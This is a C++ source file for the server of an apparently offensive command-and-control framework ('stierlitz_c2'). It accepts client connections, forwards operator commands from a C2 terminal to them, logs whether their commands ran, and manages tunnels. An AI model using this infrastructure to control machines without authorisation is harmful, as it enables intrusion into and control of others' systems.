/**
 * @file Server/server.cpp
 * @author viv4ldi
 * @brief Handles the server and clients
 * @version 0.1
 */
#include "server.hpp"

Server::Server() {
    port_ = DEFAULT_PORT;
    ip_ = DEFAULT_IP;
    max_connections_ = DEFAULT_MAX_CONNECTIONS;
    user_verbosity_ = DEFAULT_VERBOSITY;
}
Server::Server(const std::string& __ip, const uint __port, const int __max_connections) {
    port_ = __port;
    ip_ = __ip;
    max_connections_ = __max_connections;
}

Server::~Server() {
    if (!shutdown_flag_) {
        shutdown();
    }
}

int Server::init() {
    int rc;
    server_socket_ = -1;

    server_socket_ = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket_ == -1) {
        std::cerr << "[Server::init] Error creating socket" << std::endl;
        return -1;
    }

    // Set server to non blocking and reusable
    int flags = fcntl(server_socket_, F_GETFL, 0);
    if (flags == -1) {
        std::cerr << "[Server::init] Error getting socket flags" << std::endl;
        return -1;
    }
    rc = fcntl(server_socket_, F_SETFL, flags | O_NONBLOCK);
    if (rc == -1) {
        std::cerr << "[Server::init] Error setting socket to non-blocking" << std::endl;
        return -1;
    }

    int opt = 1;
    rc = setsockopt(server_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if (rc < 0) {
        std::cerr << "[Server::init] Error setting socket options" << std::endl;
        return -1;
    }

    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    rc = inet_pton(AF_INET, ip_.c_str(), &server_addr_.sin_addr);
    if (rc == 0) {
        std::cerr << RED << "[Server::init] IP address is not valid" << RESET;
        return -1;
    }
    else if (rc < 0) {
        std::cerr << RED << "[Server::init] Error converting IP address: " << strerror(errno) << RESET; // Use strerror_r for thread safety in the clients
        return -1;
    }

    rc = bind(server_socket_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
    if (rc < 0) {
        std::cerr << RED << "[Server::init] Error binding socket: " << strerror(errno) << RESET;
        return -1;
    }

    rc = listen(server_socket_, max_connections_);
    if (rc < 0) {
        std::cerr << RED << "[Server::init] Error listening on socket: " << strerror(errno) << RESET;
        return -1;
    }

    shutdown_event_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (shutdown_event_fd_.fd == -1) {
        std::cerr << RED << "[Server::init] Error creating shutdown_event_fd_: " << strerror(errno) << RESET << std::endl;
        return -1;
    }

    client_threads_.resize(max_connections_);
    clients_.resize(max_connections_);
    for (int i=0;i<max_connections_;i++) {
        clients_[i] = nullptr;
    }

    log_context_ = std::make_shared<LogContext>();
    log_context_->p_user_verbosity_ = &user_verbosity_;

    tunnel_context_ = std::make_shared<TunnelContext>();

    return 0;
}

void Server::start() {
    int rc = 0;

    std::thread accept_thread(&Server::accept_client, this);
    std::thread logger_thread(&Server::log_event, this);
    std::thread c2_thread(&Server::handle_c2, this);

    logger_thread.join();
    accept_thread.join();
    c2_thread.join();

    if (!shutdown_flag_) {
        shutdown();
    }
}

int Server::accept_client() {
    int rc;
    int client_socket;
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    EventLog event_log(log_context_); //(&log_mutex_, &log_cv_, &log_queue_, &user_verbosity_);

    ScopedEpollFD epoll_fd;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        event_log << RED << "[Server::accept_client] Error creating epoll instance: " << strerror(errno) << RESET;
        return -1;
    }

    struct epoll_event ev;
    ev.data.fd = server_socket_;
    ev.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, server_socket_, &ev) == -1) {
        event_log << RED << "[Server::accept_client] Error adding server socket to epoll: " << strerror(errno) << RESET;
        return -1;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = shutdown_event_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, shutdown_event_fd_.fd, &shutdown_event) == -1) {
        event_log << RED << "[Server::accept_client] Error adding shutdown eventfd to epoll: " << strerror(errno) << RESET;
        return -1;
    }

    struct epoll_event events[2];

    while (!shutdown_flag_) {
        int client_index = -1;

        // Wait for a free slot in clients_ or shutdown signal
        std::unique_lock<std::mutex> lock(accept_mutex_);
        accept_cv_.wait(lock, [this] {return client_count_ < max_connections_ || shutdown_flag_;});
        if (shutdown_flag_) {
            event_log << YELLOW << "[Server::accept_client] Shutdown signal received - accept_cv_" << RESET;
            return 0;
        }

        event_log << LOG_MUST << GREEN << "[Server::accept_client] Waiting for client connection" << RESET;
        
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds == -1) {
            if (errno == EINTR) {
                event_log << YELLOW << "[Server::accept_client] Shutdown signal received - EINTR" << RESET;
                return 0;
            } else {
                event_log << RED << "[Server::accept_client] Error waiting for epoll event: " << strerror(errno) << RESET;
                return -1;
            }
        } 
        
        for (int i=0; i<nfds; i++) {
            if (events[i].data.fd == shutdown_event_fd_.fd) {
                event_log << YELLOW << "[Server::accept_client] Shutdown signal received - shutdown_event_fd_" << RESET;
                uint64_t u;
                read(shutdown_event_fd_.fd, &u, sizeof(u));
                return 0;
            }

            if(events[i].data.fd == server_socket_) {
                client_socket = accept(server_socket_, (struct sockaddr*) &client_addr, &addr_len);
                if (client_socket < 0) {   
                    event_log << RED << "[Server::accept_client] Error accepting client: " << strerror(errno) << RESET;
                    return -1;
                }
                {
                    ClientHandler* client = nullptr;
                    // Search for a free slot in clients_ for the new client
                    std::lock_guard<std::mutex> lock(client_mutex_);
                    for (int i = 0; i < max_connections_; i++) {
                        if (clients_[i] == nullptr) {
                            client = new ClientHandler();
                            clients_[i] = client;
                            client = nullptr;
                            client_index = i;
                            clients_[client_index]->init_client(client_addr, client_socket, client_index);
                            client_count_++;
                            event_log << GREEN << "[Server::accept_client] New connection from: " << clients_[client_index]->ip() << RESET;
                            break;
                        }
                    }
                }
                if (client_index < 0){
                    event_log << RED << "[Server::accept_client] No free slots for new client" << RESET;
                    close(client_socket);
                    return -1;
                }
                // Start a new handle_client thread for the client
                try {
                    if (client_threads_[client_index].joinable()) {
                        client_threads_[client_index].join();
                    }
                    //client_threads_.emplace_back(&Server::handle_client, this, clients_[client_index]);
                    client_threads_[client_index] = std::thread(&Server::handle_client, this, clients_[client_index]);
                } catch (const std::system_error& e) {
                    event_log << RED << "[Server::accept_client] Error creating thread for client" << RESET;
                    {
                        std::lock_guard<std::mutex> lock(client_mutex_);
                        clients_[i]->cleanup_client();
                        client_count_--;
                    }
                    return -1;
                }
            }
        }   
    }

    return 0;
}

void Server::handle_client(ClientHandler* client) {
    char buffer[BUFFER_SIZE];
    int recv_rc;
    int send_rc;
    
    EventLog event_log(log_context_);
    while (!shutdown_flag_) {
        memset(buffer, 0, sizeof(buffer));
        recv_rc = recv_buf(client->socket(), buffer, sizeof(buffer), shutdown_flag_);
        if (recv_rc < 0) {
            event_log << RED << "[Server::handle_client] Client " << client->index() << " failed: " << recv_rc << RESET;  
            break;
        } else if (recv_rc == PEER_DISCONNECTED_ERROR) {
            event_log << RED << "[Server::handle_client] Client: " << client->index() << " disconnected" << RESET;
            break;
        } else {
            if (memcmp(buffer, OUT_KEY, OUT_KEY_LEN) == 0) {
                Status status = static_cast<uint16_t>(
                    static_cast<uint8_t>(buffer[OUT_KEY_LEN]) |
                    (static_cast<uint8_t>(buffer[OUT_KEY_LEN + 1]) << 8)
                );
                if (status == EXEC_SUCCESS) {
                    event_log << LOG_MINOR_EVENTS << GREEN << "[Server::handle_client] Client " << client->index() << " executed command successfully" << RESET_C2_FIFO;
                } else if (status == EXEC_ERROR) {
                    event_log << LOG_MINOR_EVENTS << RED << "[Server::handle_client] Client " << client->index() << " failed to execute command" << RESET_C2_FIFO;
                } else {
                    event_log << LOG_MINOR_EVENTS << YELLOW << "[Server::handle_client] Client " << client->index() << " unknown status: " << status << RESET_C2_FIFO;
                }
            } else {
                event_log << LOG_MINOR_EVENTS <<  GREEN << "[Server::handle_client] Data from client " << client->index() << ": " << buffer << RESET;                
            }
        }
    }

    event_log << YELLOW << "[Server::handle_client] Cleaning up client " << client->index() << RESET;
    
    for (auto& tunnel : tunnels_) {
        if (tunnel->client_index_ == client->index()) {
            uint64_t u = 1;
            write(*(tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
        }
    }
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        clients_[client->index()] = nullptr;
        client->cleanup_client();
        delete client;
        client_count_--;
        accept_cv_.notify_one();
    }
}

void Server::log_event() {
    while (!shutdown_flag_) {
        std::unique_lock<std::mutex> lock(log_context_->log_mutex_);
        log_context_->log_cv_.wait(lock, [this] {return !log_context_->log_queue_.empty() || shutdown_flag_;});

        if (shutdown_flag_ && log_context_->log_queue_.empty()) {
            break;
        }

        while (!log_context_->log_queue_.empty()) {
            std::cout << log_context_->log_queue_.front();
            log_context_->log_queue_.pop();
        }
    }
}

void Server::handle_c2() {
    pid_t pid = fork();

    if (pid < 0) {
        std::cerr << RED << "[Server::handle_c2] Error forking process: " << strerror(errno) << RESET;
        return;
    }
    
    if (pid == 0) {
        close(server_socket_);
        close(shutdown_event_fd_.fd);
        for (int i = 0; i < max_connections_; i++) {
            if (clients_[i] != nullptr) {
                close(clients_[i]->socket());
            }
        }
        // Child process
        execlp("urxvt", "urxvt", "-name", "stierlitz_c2", "-e", C2_SCRIPT_PATH, (char*)NULL);
        std::cerr << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
        _exit(EXIT_FAILURE);
    }

    // Parent process
    EventLog event_log(log_context_);
    CommandHandler command_handler(&clients_, &event_log, &shutdown_flag_, &ip_, port_, &user_verbosity_, &tunnels_, tunnel_context_);
    ScopedEpollFD epoll_fd;
    int rc = 0;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        event_log << RED << "[Server::handle_c2] Error creating epoll instance: " << strerror(errno) << RESET;
        return;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = shutdown_event_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, shutdown_event_fd_.fd, &shutdown_event) == -1) {
        event_log << RED << "[Server::handle_c2] Error adding shutdown eventfd to epoll: " << strerror(errno) << RESET;
        return;
    }

    // Wait for c2_terminal.py to create the fifo
    int tries = 0;
    while((!std::filesystem::exists(C2_IN_FIFO_PATH))  && tries++ < 20) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    if (tries >= 20) {
        event_log << RED << "[Server::handle_c2] Error: FIFO file not created by c2_terminal.py" << RESET;
        return;
    }

    rc = c2_fifo_.init();
    if (rc < 0) {
        event_log << RED << "[Server::handle_c2] Error initializing FIFO file: " << strerror(errno) << RESET;
        return;
    } 
    log_context_->p_c2_fifo_ = &c2_fifo_.fd_out;

    struct epoll_event fifo_event;
    fifo_event.data.fd = c2_fifo_.fd_in;
    fifo_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, c2_fifo_.fd_in, &fifo_event) == -1) {
        event_log << RED << "[Server::handle_c2] Error adding FIFO file to epoll: " << strerror(errno) << RESET;
        return;
    }

    struct epoll_event events[2];
    event_log << LOG_MUST << GREEN << "[Server::handle_c2] C2 terminal started" << RESET;
    while (!shutdown_flag_) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds == -1) {
            if (errno == EINTR) {
                continue;
            }
            event_log << RED << "[Server::handle_c2] Error waiting for epoll event: " << strerror(errno) << RESET;
            break;
        }

        for (int i=0; i < nfds; i++) {
            if (events[i].data.fd == shutdown_event_fd_.fd) {
                uint64_t u;
                read(shutdown_event_fd_.fd, &u, sizeof(u));
                goto c2_cleanup;
            } else if (events[i].data.fd == c2_fifo_.fd_in) {
                char cmd[MAX_COMMAND_LEN + 1];
                ssize_t bytes_read = read(c2_fifo_.fd_in, cmd, MAX_COMMAND_LEN + 1);
                if (bytes_read < 0) {
                    event_log << RED << "[Server::handle_c2] Error reading from FIFO: " << strerror(errno) << RESET;
                    goto c2_cleanup;
                } else if (bytes_read == 0) {
                    event_log << YELLOW << "[Server::handle_c2] C2 terminal closed" << RESET;
                    goto c2_cleanup;
                } else {
                    if (bytes_read > MAX_COMMAND_LEN) {
                        event_log << RED << "[Server::handle_c2] Are you trying to buffer overflow me?" << RESET;
                        continue;
                    }

                    if (cmd[bytes_read - 1] == '\n' || cmd[bytes_read - 1] == '\r') {
                        bytes_read--;
                    }
                    cmd[bytes_read] = '\0';
                    event_log << LOG_MINOR_EVENTS << GREEN << "[Server::handle_c2] C2 terminal message: " << cmd << RESET;
                    
                    if (strncmp(cmd, "exit", 4) == 0) {
                        event_log << YELLOW << "[Server::handle_c2] C2 terminal exit command received" << RESET;
                        shutdown_flag_ = true;

                        // Remove shutdown_event_fd from epoll since we don't need it anymore
                        if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_DEL, shutdown_event_fd_.fd, nullptr) < 0) {
                            event_log << RED << "[Server::handle_c2] Error removing shutdown eventfd from epoll: " << strerror(errno) << RESET;
                        }

                        goto c2_cleanup;
                    } else if (strncmp(cmd, "debug", 5) == 0) {
                        event_log << YELLOW << "[Server::handle_c2] Debug command received" << RESET;
                        const char* debug_message = "Debug message from server\n";
                        ssize_t bytes_written = write(c2_fifo_.fd_out, debug_message, strlen(debug_message));
                        if (bytes_written < 0) {
                            event_log << RED << "[Server::handle_c2] Error writing to FIFO: " << strerror(errno) << RESET;
                            goto c2_cleanup;
                        }
                        event_log << LOG_MINOR_EVENTS << GREEN << "[Server::handle_c2] Debug message sent to C2 terminal" << RESET;
                        continue;
                    }
                    command_handler.execute_command(cmd, bytes_read);                    
                }
            }
        }
    }
c2_cleanup:
    if (pid > 0) {
        kill(pid, SIGTERM);
        waitpid(pid, nullptr, 0);
    }
    if (shutdown_flag_) {
        shutdown();
    }
}

void Server::cleanup_server() {
    for (int i = 0; i < max_connections_; i++) {
        if (clients_[i] != nullptr) {
            clients_[i]->cleanup_client();
            delete clients_[i];
        }
    }

    if (server_socket_ != -1) {
        close(server_socket_);
    }
}

void Server::shutdown() { 
    shutdown_flag_ = true;
    
    // Wake up tunnel threads
    uint64_t u = 1;
    for (auto it=tunnels_.begin();it!=tunnels_.end();it++) {
        if ((*it)->p_tunnel_shutdown_fd_ == nullptr) {
            continue;
        }
        write(*((*it)->p_tunnel_shutdown_fd_), &u, sizeof(u));
        std::cout << MAGENTA << "[Server::shutdown] Sent shutdown signal to tunnel" << RESET;
    }

    // Wait for all tunnels to finish
    std::unique_lock<std::mutex> lock(tunnel_context_->tunnel_mutex_);
    tunnel_context_->all_processed_cv_.wait(lock, [this] {return Tunnel::active_tunnels_ == 0;});
    
    write(shutdown_event_fd_.fd, &u, sizeof(u));

    {
        std::lock_guard<std::mutex> lock(log_context_->log_mutex_);
        log_context_->log_cv_.notify_one();
    }
    
    for (auto& thread : client_threads_) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    cleanup_server();
}